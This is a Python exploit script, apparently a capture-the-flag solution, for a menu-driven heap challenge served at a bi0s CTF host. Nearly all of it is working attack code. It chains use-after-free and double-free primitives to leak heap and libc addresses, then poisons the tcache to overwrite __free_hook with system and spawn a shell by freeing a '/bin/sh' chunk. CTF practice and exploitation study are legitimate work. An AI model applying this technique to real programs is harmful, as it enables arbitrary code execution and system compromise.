# -*- coding: utf-8 -*-

#########################################################################
# File Name: exp.py
# Created on : 2021-08-14 06:32:12
# Author: r1mit
# Last Modified: 2021-08-20 23:19:47
# Description:
#########################################################################
from pwn_debug import *

## step 1
pdbg=pwn_debug("./chall")

pdbg.context.terminal=['tmux', 'splitw', '-h']
#  pdbg.context.log_level = "DEBUG"
## step 2
pdbg.local("")
#  pdbg.debug("2.23")
pdbg.remote('pwn.challenge.bi0s.in', 1234)
## step 3
p=pdbg.run("local")
#p=pdbg.run("debug")
#  p=pdbg.run("remote")

#  pdbg.bp([0x1d3b])

elf=pdbg.elf

libc=pdbg.libc

def add(size, data):
    p.recvuntil("Choice >> ")
    p.sendline("1")
    p.recvuntil("length : ")
    p.sendline(str(size))
    p.recvuntil("data : ")
    p.send(data)

def remove(idx, offset):
    p.recvuntil("Choice >> ")
    p.sendline("2")
    p.recvuntil("index: ")
    p.sendline(str(idx))
    p.recvuntil("all) ")
    p.sendline(str(offset))

def link(to_idx, from_idx):
    p.recvuntil("Choice >> ")
    p.sendline("3")
    p.recvuntil("index: ")
    p.sendline(str(to_idx))
    p.recvuntil("index: ")
    p.sendline(str(from_idx))

def unlink(idx, offset, choice):
    p.recvuntil("Choice >> ")
    p.sendline("4")
    p.recvuntil("index: ")
    p.sendline(str(idx))
    p.recvuntil("offset: ")
    p.sendline(str(offset))
    p.recvuntil("(y/n)? ")
    p.sendline(choice)

def exploit():
    p.sendline("a")
    add(0x50, p64(0)+p64(0x411)+p64(0)+p64(0x421)) #0 deploy the 0x420 size first, which will be used to build fake chunk to free to the unsorted bin.

    # the three main palygroung
    add(0x60, 'a') #1
    add(0x60, 'b') #2
    add(0x50, 'b') #3

    # fill the heap, and place the data 0x51, to from the upper fake 0x420 large chunk
    for i in range(4, 10):
        add(0x60, (p64(0)+p64(0x51))*6)

    # free 1st chunk
    remove(0, 1)

    
    link(1, 2) # form 1->2 node chain
    link(1, 3) # form 1->2->3 node chain
    
    # key here
    unlink(1, 2, 'y') #0, unlink the chunk, which will form 1->3 in 1st node chain, and the Table[0] is 2->3 node chain.
    
    # key here
    remove(0, 1337) # remove 0, it will free node 2 and node 3 to system, now the 1st node chain 1->3, the node 3 is a freed node, but the name ptr is set to 0.

    add(0x50, 'b') #0, malloc out the 3 chunk again, now 1st node chain 1->3, the node 3 and 0 node chunk are the same memory, now we can do arbitrary things.

    add(0x60, 'b') #2, just add a node chain here.
    link(2, 0) # link the 0 node chain to 2nd node chain
    remove(2, 2) # unlink the offset 2, it will free the node 3 again, and now the 1st node chain 1->3, the node 3 will be freed again, and the name ptr is not set to 0, and points to the tcache heap addr
    #  pdbg.bp([0x195e])
    # remove 1, 1, so we can leak node 3's name which is heap addr.
    p.recvuntil("Choice >> ")
    p.sendline("2")
    p.recvuntil("index: ")
    p.sendline("1")
    p.recvuntil("Offset 2 : ")
    leak_heap = u64(p.recvuntil("\n")[:-1].ljust(8, '\x00'))
    print("[+] leak heap: "+hex(leak_heap))
    heap_base = leak_heap - 0x2a0
    p.recvuntil("all) ")
    p.sendline("1")

    
    add(0x60, 'a') # malloc out the freed memory
    link(0, 1) # link, 0 node chain some->3 memory layout.

    add(0x50, 'a') #1, the node 3 now in the 1st node chain.

    # free the fill space to spare node space
    for i in range(4, 10):
        remove(i, 1)

    # make spare tcache count, next we want reuse the name ptr to a node manage context
    add(0x18, 'a') #3
    add(0x18, 'a') #4
   

    link(2, 1) # link again, now forms 0 node chain some->3, 2nd node chain some->3 memory layout again
    
    remove(2, 2) # now free the node 3 again

    add(0x18, p64(0)+p64(0x400)+p64(leak_heap+0x20)) #1, the name ptr here will occupy the node 3's manage context, now the node 3's name ptr points to fake 0x420 large chunk.
    
    remove(0, 2) # here will free the large chunk to unsroted bin.

    #  pdbg.bp([0x195e])
    add(0x50, 'a') #5, node 3 is malloc out again.

    link(3, 5) # 3rd node chain forms some->3 layout
    link(3, 1)

    remove(3, 3)# free the node 3's manage context

    add(0x50, 'a') #1, make the node'3 manage context as the first 0x20 tcache bin.

    add(0x18, p64(0)+p64(0x400)+p64(leak_heap+0x20)) #5, now the node 3's manage context has been malloc out as name again, and the node 3's name points to main_arena address
    link(3, 1)

    # remove 3, 3, leak the node 3's name ptr to leak main_arena addr
    p.recvuntil("Choice >> ")
    p.sendline("2")
    p.recvuntil("index: ")
    p.sendline("3")
    p.recvuntil("Offset 2 : ")
    leak_libc = u64(p.recvuntil("\n")[:-1].ljust(8, '\x00'))
    print("[+] leak libc: "+hex(leak_libc))
    libc_base = leak_libc - 0x1ebbe0
    print("[+] libc base: "+hex(libc_base))
    free_hook = libc_base + libc.symbols['__free_hook']
    system_addr = libc_base + libc.symbols['system']
    p.recvuntil("all) ")
    p.sendline("3")

    #  pdbg.bp([0x195e, 0x159c])
    remove(0, 1337)
    add(0x30, '/bin/sh\x00') #0
    add(0x40, p64(0)+p64(2)+p64(3)+p64(4)+p64(free_hook)+p64(6)) # malloc from fake unsorted bin, and change the 0x60 tcache bin's fd to free_hook
    add(0x60, 'a') #6 
    add(0x60, p64(system_addr)) # malloc out free_hook
    #  pdbg.bp([0x195e])
    remove(0, 1337) # get shell
    p.interactive()


if __name__ == "__main__":
    exploit()
